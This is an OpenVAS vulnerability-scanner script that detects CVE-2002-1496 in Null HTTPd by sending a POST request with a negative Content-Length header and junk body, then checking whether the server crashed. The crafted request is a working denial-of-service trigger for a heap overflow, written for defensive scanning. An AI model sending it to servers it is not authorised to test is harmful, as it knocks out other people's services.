##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_null_httpd_server_content_length_bof_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Null HTTPd Server Content-Length HTTP Header Buffer overflow Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary code on
  the target system or cause the web server to crash.
  Impact Level: Application";
tag_affected = "Null HTTPd Server version 0.5.0 or prior";
tag_insight = "Improper way of handling of negative 'Content-Length' values in HTTP header
  field, leads to a buffer overflow. By sending an HTTP request with a negative
  value in the 'Content-Length' header field, a remote attacker could overflow
  a buffer and cause the server to crash or execute arbitrary code on the
  system.";
tag_solution = "Upgrade Null HTTPd Server to 0.5.1 or later,
  For updates refer to http://freecode.com/projects/nullhttpd";
tag_summary = "This host is running Null HTTPd Server and is prone to heap based
  buffer overflow vulnerability.";

if(description)
{
  script_id(802923);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2002-1496");
  script_bugtraq_id(5774);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-07-27 11:36:16 +0530 (Fri, 27 Jul 2012)");
  script_name("Null HTTPd Server Content-Length HTTP Header Buffer overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/10160");
  script_xref(name : "URL" , value : "http://archives.neohapsis.com/archives/bugtraq/2002-09/0284.html");

  script_description(desc);
  script_summary("Check if Null HTTPd Server is vulnerable to DoS");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
Postdata = "";
sndReq = "";
rcvRes = "";
banner = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check port state
if(!get_port_state(port)){
  exit(0);
}

## Get teh banner and confirm application
banner = get_http_banner(port:port);
if(!banner || "Server: Null httpd" >!< banner){
  exit(0);
}

## Construct POST req
Postdata = crap(500);
sndReq = string("POST / HTTP/1.1\r\n",
                "Host: ", get_host_name(),"\r\n",
                "Content-Length: -1000\r\n\r\n", Postdata);
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

## Check port is alive or dead
if(http_is_dead(port:port)){
  security_hole(port);
}
